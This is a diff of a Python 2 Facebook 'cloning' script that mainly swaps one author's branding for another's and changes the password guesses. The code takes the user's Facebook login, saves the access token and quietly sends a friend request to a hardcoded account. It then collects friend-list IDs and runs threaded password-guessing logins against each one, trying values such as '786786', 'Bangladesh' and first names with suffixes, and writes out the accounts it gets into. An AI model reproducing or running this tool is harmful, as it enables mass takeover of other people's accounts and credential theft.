@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To Raisul
+#The Credit For This Code Goes To Raisul Islam
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2022
 
@@ -51,19 +51,19 @@ def jalan(z):
 #Dev:dada_hacker
 ##### LOGO #####
 logo = """
-       \033[1;91m:  ____       _           _ 
-      \033[1;92m: |  _ \ __ _(_)___ _   _| |
-     \033[1;93m: | |_) / _` | / __| | | | |
-    \033[1;94m: |  _ < (_| | \__ \ |_| | |
-   \033[1;95m: |_| \_\__,_|_|___/\__,_|_|
+\033[1;91m:    ____        _            __
+\033[1;92m:   / __ \____ _(_)______  __/ /
+\033[1;93m:  / /_/ / __ `/ / ___/ / / / / 
+\033[1;94m: / _, _/ /_/ / (__  ) /_/ / /  
+\033[1;95m:/_/ |_|\__,_/_/____/\__,_/_/   
   \033[1;96m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::        
   \033[1;91m:》》》\033[1;93m01309200208\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
-\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-DADA-\033[1;95m♡╭──────────•◈•──────────╮♡
-\033[1;92m..........................RAISUL ISLAM......................
+\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-Raisul islam-\033[1;95m♡╭──────────•◈•──────────╮♡
+\033[1;92m..........................Raisul islam......................
 \033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
-\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   BANGLADESH
+\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Bangladesh
 \033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
-\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mRAISUL\033[1;95m♡╰──────────•◈•──────────╯♡"""
+\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mRaisul islam\033[1;95m♡╰──────────•◈•──────────╯♡"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -89,22 +89,22 @@ print  """
  \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈
  \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
   \033[1;96m ─────────────•◈•──────────  
-   \033[1;92m███████▒▒Welcome To Dada vau tools▒▒████████
-\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mRaisul\033[1;95m♡╭──────────•◈•──────────╮♡
-\033[1;94mAuthor\033[1;91m: \033[1;91mdadahacker
-\033[1;94mRaisul\033[1;91m: \033[1;91▒▓██████████████]99.9
-\033[1;94mFacebook\033[1;91m: \033[1;91mdadahacker
+   \033[1;92m███████▒▒Welcome To Dada tools▒▒████████
+\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mRaisul islam\033[1;95m♡╭──────────•◈•──────────╮♡
+\033[1;94mAuthor\033[1;91m: \033[1;91mRaisul islam
+\033[1;94mRaisul islam\033[1;91m: \033[1;91▒▓██████████████]99.9
+\033[1;94mFacebook\033[1;91m: \033[1;91mDada is back
 \033[1;94mWhatsapp\033[1;91m: \033[1;91m01309200208
-\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mRaisul\033[1;95m♡╰──────────•◈•──────────╯♡"""
-jalan('              \033[1;96m....................Raisul.....................:')
+\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mRaisul islam\033[1;95m♡╰──────────•◈•──────────╯♡"""
+jalan('              \033[1;96m....................Raisul islam.....................:')
 jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")
 jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   ')
 jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   ')
 jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈ ")
 jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
-print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mdada Raisul\033[1;95m♡╰──────────•◈•──────────╯♡"
+print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin Raisul islam\033[1;95m♡╰──────────•◈•──────────╯♡"
 
-CorrectUsername = "Raisul"
+CorrectUsername = "Raisul islam"
 CorrectPassword = "dadahacker"
 
 loop = 'true'
@@ -118,23 +118,23 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+            os.system('xdg-open https://www.facebook.com/OPRStatusKing/')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+        os.system('xdg-open https://www.facebook.com/OPRStatusKing/')
 
-def dada():
+def login():
 	os.system('clear')
 	try:
-		toket = open('dada.txt','r')
+		toket = open('login.txt','r')
 		menu() 
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
 		jalan(' \033[1;92mWarning: \033[1;97mDo Not Use Your Personal Account' )
-		jalan(' \033[1;92m   Note: \033[1;97mUse a New Account To dadavau' )
-		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaisul\033[1;95m♡──────────•◈•──────────♡"
-		print('	   \033[1;94m♡\x1b[1;91m》》》》》》dada is back WITH FACEBOOK《《《《《《\x1b[1;94m♡' )
+		jalan(' \033[1;92m   Note: \033[1;97mUse a New Account To Login' )
+		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaisul islam\033[1;95m♡──────────•◈•──────────♡"
+		print('	   \033[1;94m♡\x1b[1;91m》》》》》》LOGIN WITH FACEBOOK《《《《《《\x1b[1;94m♡' )
 		print('	' )
 		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')
 		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')
@@ -152,8 +152,8 @@ def dada():
 		url = br.geturl()
 		if 'save-device' in url:
 			try:
-				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.dadapassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.dada","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
 				x=hashlib.new("md5")
 				x.update(sig)
 				a=x.hexdigest()
@@ -161,11 +161,11 @@ def dada():
 				url = "https://api.facebook.com/restserver.php"
 				r=requests.get(url,params=data)
 				z=json.loads(r.text)
-				unikers = open("dada.txt", 'w')
+				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;95mdada Successful...'
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				print '\n\x1b[1;95mLogin Successful...'
+				os.system('xdg-open https://www.facebook.com/OPRStatusKing/')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -173,26 +173,26 @@ def dada():
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\x1b[1;92mYour Account is on Checkpoint")
-			os.system('rm -rf dada.txt')
+			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
 			print("\n\x1b[1;93mPassword/Email is wrong")
-			os.system('rm -rf dada.txt')
+			os.system('rm -rf login.txt')
 			time.sleep(1)
-			dada()
+			login()
 
 
 def menu():
 	os.system('clear')
 	try:
-		toket=open('dada.txt','r').read()
+		toket=open('login.txt','r').read()
 	except IOError:
 		os.system('clear')
 		print"\x1b[1;91mToken invalid"
-		os.system('rm -rf dada.txt')
+		os.system('rm -rf login.txt')
 		time.sleep(1)
-		dada()
+		login()
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
@@ -201,9 +201,9 @@ def menu():
 	except KeyError:
 		os.system('clear')
 		print"\033[1;91mYour Account is on Checkpoint"
-		os.system('rm -rf dada.txt')
+		os.system('rm -rf login.txt')
 		time.sleep(1)
-		dada()
+		login()
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;92mThere is no internet connection"
 		keluar()
@@ -212,7 +212,7 @@ def menu():
 	print "  \033[1;95m«-----♡----\033[1;93mLogged in User Info\033[1;95m----♡-----»"
 	print "	   \033[1;94m Name\033[1;93m:\033[1;92m"+nama+"\033[1;97m               "
 	print "	   \033[1;97m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;97m              "
-	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaisul\033[1;95m♡──────────•◈•──────────♡"
+	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaisul islam\033[1;95m♡──────────•◈•──────────♡"
 	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
 	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
 	pilih()
@@ -227,7 +227,7 @@ def pilih():
 		super()
 	elif unikers =="0":
 		jalan('Token Removed')
-		os.system('rm -rf dada.txt')
+		os.system('rm -rf login.txt')
 		keluar()
 	else:
 		print "\x1b[1;91mFill in correctly"
@@ -238,12 +238,12 @@ def super():
 	global toket
 	os.system('clear')
 	try:
-		toket=open('dada.txt','r').read()
+		toket=open('login.txt','r').read()
 	except IOError:
 		print"\x1b[1;91mToken invalid"
-		os.system('rm -rf dada.txt')
+		os.system('rm -rf login.txt')
 		time.sleep(1)
-		dada()
+		login()
 	os.system('clear')
 	print logo
 	print "\033[1;96m--\033[1;92m> \033[1;92m1.\x1b[1;91mClone From Friend List..."
@@ -259,7 +259,7 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaisul\033[1;95m♡──────────•◈•──────────♡"
+		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaisul islam\033[1;95m♡──────────•◈•──────────♡"
 		jalan('\033[1;93mGetting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -269,14 +269,14 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;96m[♡] \033[1;92mEnter ID\033[1;93m: \033[1;97m")
-		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaisul\033[1;95m♡──────────•◈•──────────╯♡"
+		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaisul islam\033[1;95m♡──────────•◈•──────────╯♡"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
 			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
 		except KeyError:
 			print"\x1b[1;92mID Not Found!"
-			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
+			raw_input("\n\033[1;96m[\033[1;94mraisul\033[1;96m]")
 			super()
 		print"\033[1;93mGetting IDs\033[1;93m..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
@@ -295,9 +295,9 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m«-----\x1b[1;93m♡To Stop Process Press CTRL+Z♡\033[1;94m----»"
-	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaisul\033[1;95m♡──────────•◈•──────────♡"
+	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaisul islam\033[1;95m♡──────────•◈•──────────♡"
 	jalan(' \033[1;93m ........Cloning Start plzzz Wait.......... ')
-	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaisul\033[1;95m♡──────────•◈•──────────♡"
+	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaisul islam\033[1;95m♡──────────•◈•──────────♡"
 	
 			
 	def main(arg):
@@ -306,12 +306,12 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Dada_hacker
+			pass #Dev:dada_hacker
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
 			pass1 = ('786786')
-			data = urllib.urlopen("https://b-api.facebook.com/method/auth.dada?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
 				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
@@ -325,7 +325,7 @@ def pilih_super():
 					cekpoint.append(user+pass1)
 				else:
 					pass2 = 'Bangladesh'
-					data = urllib.urlopen("https://b-api.facebook.com/method/auth.dada?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
 						print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
@@ -338,8 +338,8 @@ def pilih_super():
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
-							pass3 = a['first_name'] + 'king'
-							data = urllib.urlopen("https://b-api.facebook.com/method/auth.dada?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							pass3 = a['first_name'] + 'rajpoot'
+							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
 								print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
@@ -352,8 +352,8 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = b['first_name'] + 'Sohel'
-									data = urllib.urlopen("https://b-api.facebook.com/method/auth.dada?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									pass4 = b['first_name'] + 'mughal'
+									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
 										print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
@@ -366,8 +366,8 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = b['first_name'] + 'Raisul'
-											data = urllib.urlopen("https://b-api.facebook.com/method/auth.dada?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+											pass5 = b['first_name'] + 'malik'
+											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
 												print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
@@ -380,8 +380,8 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = b['first_name'] + 'dada'
-													data = urllib.urlopen("https://b-api.facebook.com/method/auth.dada?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													pass6 = b['first_name'] + 'khan'
+													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
 														print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
@@ -396,8 +396,8 @@ def pilih_super():
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = b['first_name'] + 'hacked'
-															data = urllib.urlopen("https://b-api.facebook.com/method/auth.dada?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+															pass7 = b['first_name'] + 'afridi'
+															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
 																print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
@@ -416,8 +416,8 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaisul\033[1;95m♡──────────•◈•──────────♡"
-	print "  \033[1;93m«---•◈•---Developed By Raisul---•◈•---»" #Dev:Dada_hacker
+	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaisul islam\033[1;95m♡──────────•◈•──────────♡"
+	print "  \033[1;93m«---•◈•---Developed By Raisul---•◈•---»" #Dev:dada_hacker
 	print '\033[1;91mProcess Has Been Completed\033[1;92m....'
 	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
 	print """
@@ -427,13 +427,13 @@ def pilih_super():
              [███████████████]
              ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
 ♡──────────────•◈•──────────────♡.
-: \033[1;96m .....Dada-hacker  Raisul........... \033[1;93m :
+: \033[1;96m .....dadahacker  Raisul islam........... \033[1;93m :
 ♡──────────────•◈•──────────────♡.' 
                 whatsapp Num
                01309200208"""
 	
-	raw_input("\n\033[1;92m[\033[1;94mraisul\033[1;96m]")
+	raw_input("\n\033[1;92m[\033[1;94mRaisul\033[1;96m]")
 	menu()
 
 if __name__ == '__main__':
-	dada()
+	login()
